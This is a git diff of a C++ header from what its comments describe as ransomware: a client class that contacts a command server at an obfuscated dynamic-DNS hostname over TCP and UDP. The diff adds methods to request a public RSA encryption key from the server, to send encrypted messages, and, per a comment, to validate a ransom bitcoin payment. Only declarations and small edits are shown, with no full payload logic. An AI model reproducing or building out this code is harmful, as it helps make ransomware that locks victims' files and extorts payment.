@@ -6,12 +6,15 @@
 #include "obfuscate.h"
 #include "net_common.h"
 
+#include "External/base64.h"
+
 #include <memory>
 #include <algorithm>
 #include <random>
 #include <openssl/bio.h>
 
-#pragma comment(lib, "ws2_32.lib")
+
+#pragma comment( lib, "ws2_32.lib" )
 
 const unsigned int UDP_PORT = 5454;
 const std::string  DNS_NAME = std::string(HIDE("logicgate-test.ddns.net"));
@@ -99,6 +102,13 @@ public:
     BOOL          PingServer(SocketTypes serverType);
     BOOL          ReceiveDataOnSocket(SocketTypes s);
     
+    /*
+        Send a message to the main tcp server
+        i.e ask for public encryption key or validating a ransom btc payment
+    */
+    BOOL          TCPSendMessageToServer(ClientMessage message);
+    BOOL          TCPSendEncryptedMessageToServer(ClientMessage message);
+
     inline const SOCKET GetTCPSocket() const {
         return this->TCPSocket;
     }
@@ -117,15 +127,11 @@ public:
 
 protected:
 
-    /*
-        Send a message to the main tcp server
-        i.e ask for public encryption key or validating a ransom btc payment
-    */
-    BOOL          TCPSendMessageToServer(ClientMessage message);
-
     ServerCommand TCPRecvMessageFromServer() {
         ServerCommand message;
         NetCommon::TCPRecvMessage(this->TCPSocket, message);
+        OutputDebugStringA("recv message");
+        return message;
     }
 
     /*
@@ -139,6 +145,8 @@ protected:
     BOOL          UDPSendMessageToServer(ClientMessage message);
 
     sockaddr_in   UDPRecvMessageFromServer(UDPResponse& out);
+
+    BIO*          GetPublicRSAKeyFromServer();
 
     // Further details on client
     Server        ConnectedServer = {};          // Information on the clients connected server
